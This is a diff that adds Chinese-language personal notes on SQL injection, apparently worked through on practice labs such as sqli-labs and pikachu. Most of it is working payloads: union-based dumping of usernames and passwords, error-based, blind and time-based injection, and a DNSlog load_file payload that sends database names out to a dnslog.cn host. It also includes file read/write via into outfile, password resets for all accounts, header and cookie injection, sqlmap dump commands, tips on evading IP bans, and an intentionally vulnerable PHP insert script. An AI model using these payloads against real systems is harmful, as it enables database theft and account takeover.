@@ -1,1 +1,490 @@
-123
+SQL 注入经常出现的地方
+凡是和数据库有互动的地方，都意味着传参，传参后显示的内容可区分为几类
+显示报错位、不显示报错位（溢出报错、时间报错）
+* 内部实现 / 流程的角度
+url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For...
+* 业务点
+新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框...
+
+select和group_concat()的区别
+select table_name (只有一个元素，即使空间有剩余）
+select group_concat(table_name) (爆出所有元素）
+
+判断闭合方式
+闭合方式' " () ('x') (('x')) ("x") (("x")) (())
+无法判断闭合方式时，要多方面求证
+2' and '1'='1，若返回结果为id=2时的值，则说明注入类型为'，若返回结果为id=1时的值，说明注入类型为')。原因：注入类型为'时，所构造的sql语句为'2' and '1'='1',返回的值为'2',所以所查询的结果为id=2。注入类型为')时，所构造的sql语句为('2' and '1'='1')，这时会把括号内的值当做布尔值处理。括号内的值为0，最终返回id=1
+
+搜索
+select * from table1 where username like '% x %';
+插入数据
+insert into table1 (username,password,xx1,xx2) values('zj','123','xx1','xx2');
+
+不太熟题目
+http://sqlilabs.njhack.xyz/   //sql注入攻击靶场
+class-7 文件注入
+class-17 重置密码 ’or 1=1 # (重置所有密码，危害性很大，破坏隐蔽性）
+
+
+
+
+========================
+
+http://sqlilabs.njhack.xyz/Less-1/index.php?id=2
+
+步骤1：
+推断数据库语法大概是什么（通过确认语法才能判断大概的闭合方式）
+查询、POST、GET、插入
+
+select  * from [某个表] where id = [参数] limit 0,1;
+
+select  * from [某个表] where id = '2' limit 0,1;
+
+步骤2:
+让他报错，显示自己的闭合方式，确认请求方式GET/POST
+select  * from [某个表] where id = '2\' limit 0,1;
+
+1\' LIMIT 0,1
+' " ') ") )) ")) ')) +没有闭合
+
+步骤3:
+验证目标的闭合方式
+select  * from [某个表] where id = ' 2'--+  ' limit 0,1;
+执行之后
+select  * from [某个表] where id = ' 2'
+
+如果执行成功，闭合凡是就是你所想的
+
+and 1=1 --+  确认可以夹带私货
+（注释的目的是过掉limit如果没有就不用加注释）
+
+步骤4:
+确定一下，多少个列
+select  * from [某个表] where id = ' 2' order by 10 --+  ' limit 0,1;
+判断一下他是否有10列，如果有显示正常，如果没有就报错
+
+通过二分法判断有多少列
+select  * from [某个表] where id = ' 2' order by 3 --+  ' limit 0,1;
+不报错，所以有3列（小于3也不会报错）
+
+步骤5:
+使用联合查询
+因为推断出有3列，所以union select 1,2,3
+记住！前面的参数必须出错，否则后面的1，2，3报错位出不来
+id=-2' union select 1,2,3  --+
+出现报错位，分别问2，3
+（报错不能是闭合方式位错误而报错）
+步骤6：
+开始刺探内部内容
+id=-2' union select 1,database(),3  --+
+输出数据库库名
+
+输出库名为security
+
+version()
+user()
+@@datadir
+
+information_schema是自带的，相当于数据库户口本
+information_schema的tables保存着所有数据库库名和表名的对应关系
+information_schema的columns保存着库名--表名--列名所有对应关系
+
+id=-2' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1 --+
+修改limit后面的参数即可
+emails
+referers
+uagents
+users
+
+id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
+
+步骤7：
+查询表中的列
+id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
+
+发现:id,username,password
+
+步骤8：
+查询内容
+union select 1,group_concat(username),group_concat(password) from users --+
+mysql 命令行操作
+select count(*) from table1 
+计算一下你选取的有多少结果
+
+
+select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2) group by a;
+前后概率问题，发生冲突
+
+第二种注入方法：
+报错注入(概率问题）
+基础版（最基础、最核心）
+id=2' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)a form information_schema.tables group by a)b) --+
+
+0x3a  等价于  :
+0x7e  等价于 ~
+
+简单高效版：（不管值正不正确，只要前端闭合，后端代码就可以执行）
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
+
+' and updatexml(1,concat(0x7e,(select database()),0x7e)) --+
+
+三----六 （写工具的时候仔细研究？？？）--没有经过实战测试
+第三种注入方法： class-8
+
+以后自己写工具在仔细研究
+盲注入（不知道闭合方式）
+比对正常与非正常情况
+
+采用python编程比较穷举
+sqlmap攻击
+
+推出闭合方式
+
+select database() ;
+展示当前数据库库名
+
+select length(database(),1,1)
+截取数据库库名（haha），从人类的第一个字，截取一个
+
+select ascii(substr(database(),1,1))=104;
+截取数据库名，从人类的第一个字，截取一个并转为acsii码，判断大小
+
+对照acsii表
+
+select ascii(substr(database(),1,1))=104;
+截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104
+
+实战：
+?id=1' and  (select ascii(substr(database(),1,1))= 115 )--+
+
+?id=1' and  (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )--+
+
+第四种注入方法：
+（验证用单引号） 还是需要验证闭合方式  
+布尔时间型盲注
+界面无反应且无法推断闭合方式
+界面上完全没有反应，但是你好像觉得可以注入，不管正确还是错误都是同一个界面
+
+select sleep(5);
+等5s后输出一个0
+
+and if((select database() )="haha",sleep(5),null);
+如果数据库是haha，睡5s，如果不是什么都不做
+
+实战：
+id=2' and sleep(5) --+
+
+id=2' and if((select database())="security",sleep(5),null)--+
+
+id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null)--+
+
+第五种注入方法：
+
+在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池。。。
+DNSlog注入（一般用于盲注，且没有sqlmap的情况下）
+1' and if((select load_file(concat('\\\\',(select database()),'.b48xu1.dnslog.cn\\x2'))),1,0) --+
+
+\\\\pikachu.b48xu1.dnslog.cn\x2
+
+设置my.ini
+[mysqld]
+secure_file_priv=
+否则不支持load_file命令
+
+
+第六种注入方法：  class-7 
+（没有发现报错位，通过直接创造文件并存储）
+into outfile/load_file
+name=-1' union select 1,load_file('C:/a.txt') --+ 读取c盘下的a.txt文件
+name=-1' union select 1,load_file('C:/a.txt')  into outfile 'C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt' --+ 读取c盘的a.txt内容到自己目录下的haha.txt
+这个into outfile不具备创建文件的能力!!!!!!
+
+越权改密(注册账号时，没有规范用户名）
+$new_pass1=$_POST['new_pass1'];
+
+当可以注册用户的时候，我们思考一下能不能通过自己修改密码去修改别人的密码
+新注册一个用户名admin '# 密码随意   不是admin ')#
+那么修改这个用户名密码的时候，其实是修改admin用户的密码
+
+密码重置
+
+update users set password="$new_pass" where username="$user" and password="$old_pass";
+
+admin' #
+update users set password='123' where username='admin' #
+
+----------------------
+宽字节注入
+
+mysql用gbk编码，把2个字符当作一个汉字存在
+%df吃掉\，因为urlencode(\')= %5c%27，如果前面加上%df，%df%5c是一个汉字,%27会独立出来
+
+id=-2%df' union select 1,2,3 --+
+database() 或者使用ASCII16进制编码，来避免“的使用
+
+在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文
+
+uname=admi%df' union select 1,2 #&passwd=admin&submit=Submit
+
+堆叠注入
+
+id=1';insert into users(username,password)values('zj123','xxxx') --+
+网站是那种需要注册码的注册
+
+` 反引号里面的不是命令，不和table关键字冲突
+
+SELECT * FROM users WHERE username='admin' or '1'='1 ' AND password='$password'
+
+SELECT * FROM users WHERE username='x' union select 1,'admin',md5('admin') # '
+x' union select 1,'admin',md5('admin') #
+admin
+----------
+
+UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1
+
+UPDATE noescvotes SET `bill`=111,`george`=`george`=`bill`=111,`george`=`george`+1 WHERE id=1
+
+bill`=111,`george`=`george
+ 
+` 反引号很重要
+以后写数据库语句的时候，最好用反引号
+反引号修饰表名，列名
+插入数据可以使用''
+
+
+
+第二大类：
+POST注入
+#注释且用burp抓包 右键send to repeter
+
+猜测源码
+
+$u = $_POST['uname'];
+$p = $_POST['passwd'];
+
+select username,password from table1 where username=("$u") and password=("$p") limit 0,1;
+
+select username,password from table1 where username=("\") and password=("") limit 0,1;
+
+判断为单引号闭合
+\' and password='' LIMIT 0,1
+
+select username,password from table1 where username=' ' or 1=1 limit 1,1 #   ' and password='$p' limit 0,1;
+
+select username,password from table1 where username=' admin' and 1=1 #
+
+
+select username,password from table1 where username=' ' union select 1,2 #   ' and password='$p' limit 0,1;
+
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
+
+
+判断闭合方式
+") or 1=1 #
+
+用户名和密码都写（知道闭合方式，免密码免账号登录）
+") or ("1")=("1
+
+select username,password from table1 where username=("") or ("1")=("1") and password=("") or ("1")=("1") limit 0,1;
+
+布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照 
+(找回密码等方式，判断用户名是否存在）class-15  class-16
+admin") and (select database()='security') #   and确保两个条件都正确
+
+防火墙把”--+“ ”#“屏蔽掉，采用补全措施") or ("1")=("1
+
+
+密码重置：
+不加限制，破坏性巨大（最好不找对别人有修改的漏洞，有暴露的风险）
+（增删改查之改）
+post注入修改密码
+
+update users set password='$pass' where username='Dumb';
+
+update users set password='' or 1=1 #' where username='Dumb';
+
+
+update users set password=1 
+
+http 头注入
+通过修改burp内信息，来判断数据库从哪里获取信息，
+user-agent 头注入
+
+会记录用户数据到数据库
+
+文本容易入侵，相较于.10进制固定格式IP
+修改密码
+
+
+===================
+（以下为炸鱼操作，注意获取闭合方式，只要鱼雷扔的多，总能炸掉一条）难道只能拿到库名？？
+http 头注入 class-18
+
+user-agent = 浏览器信息
+
+会记录用户数据到数据库
+
+insert into 'security'.'uagents'('uagent','ip_address','username') values('浏览器信息','127.0.0.1','admin');
+
+insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' or '1'='1   ','127.0.0.1','admin');
+
+' ' or '1'='1    '  
+
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1
+
+insert into 'security'.'uagents'('uagent','ip_address','username') values(' ' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1    ','127.0.0.1','admin');
+？？？后面操作有问题
+
+referer = 来路信息（从哪个网站过来的）
+
+cookie 可能导致平行越权
+cookie注入可行
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
+
+admin" and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
+
+cookie抓包，进去后刷新
+（平行越权）
+
+url编码：%3d 等价于 =
+
+
+pikachu靶场
+sql注入
+1
+使用\发现没有闭合方式
+1 order by 2
+
+-1 union select 1,2 
+
+-1 union select 1,database()
+pikachu
+
+-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
+
+2
+'闭合
+/sqli_str.php?name=-1' union select 1,2  --+
+
+3
+搜索
+select * from table1 where username like '% x %';
+
+name=x%' order by 3--+
+
+x%' union select 1,2,3 --+
+
+name=x%' union select 1,2,database() --+
+
+4
+\')
+') 
+
+name=x') union select 1,2 --+
+
+5
+在注册的时候，抓包
+发现'闭合
+insert into table1 (username,password,xx1,xx2) values('zj','123','xx1','xx2');
+
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '
+1' and extractvalue(1,concat('~',database())) or '
+
+update table1 set sex='$sex',phonenum='$phone',address='$add',email='$email' where username='aaa'
+
+6
+delete from xxx where id=58
+
+id=59 and extractvalue(1,concat(0x7e,(select database()),0x7e))
+
+7
+User-Agent: haha 1' and extractvalue(1,concat('~',database())) or '
+
+8
+sqlmap -u "目标" --dbs
+sqlmap -u "目标" -D pikachu --tables --batch --threads 10
+sqlmap -u "目标" -D pikachu -T users --columns --batch --threads 10
+sqlmap -u "目标" -D pikachu -T users -C username,password --dump --batch --threads 10
+
+DNSlog注入
+1' and if((select load_file(concat('\\\\',(select database()),'.b48xu1.dnslog.cn\\x2'))),1,0) --+
+
+\\\\pikachu.b48xu1.dnslog.cn\x2
+
+设置my.ini
+[mysqld]
+secure_file_priv=
+否则不支持load_file命令
+
+9
+sqlmap -u "目标" --technique T -D pikachu --tables --batch --threads 10
+
+10
+POST/宽字节注入
+name=a%df' union select 1,database() --+
+
+
+T28 (靶场）
+20')%0aunionunion%0aselect%0aselect%0a 1,database(),3%0a ||%0a('1
+
+sql注入代码后台
+<?php  
+
+$servername = "localhost";
+$username = "root";
+$password = "root";
+$dbname = "haha";
+
+//创建链接
+$con = new mysqli($servername,$username,$password,$dbname);
+
+//检测连接
+if($con->connect_error){
+    die("我死了".$con->connect_error);
+}
+
+if(isset($_GET['a'])&&isset($_GET['b'])){
+    $a = $_GET['a'];
+    $b = $_GET['b'];
+    //insert table1 (`username`,`password`) value('test3','test33'),('test2','test22')
+    $sql = "insert table1 (username,password) value('$a','$b')";
+    echo $sql.'<br/>';
+
+    if($con->query($sql)===TRUE){
+        echo '执行成功<br/>';
+    }else{
+        echo '执行失败<br/>';
+    }
+}
+
+echo '<hr>';
+
+//查
+$sql1 = "select * from table1";
+$result = $con->query($sql1);
+
+//判断是否有数据
+if($result->num_rows>0){
+    while($row = $result->fetch_assoc()){
+        echo $row['username'].'------'.$row['password'].'<br/>';
+    }
+}
+
+$con->close();
+
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+-
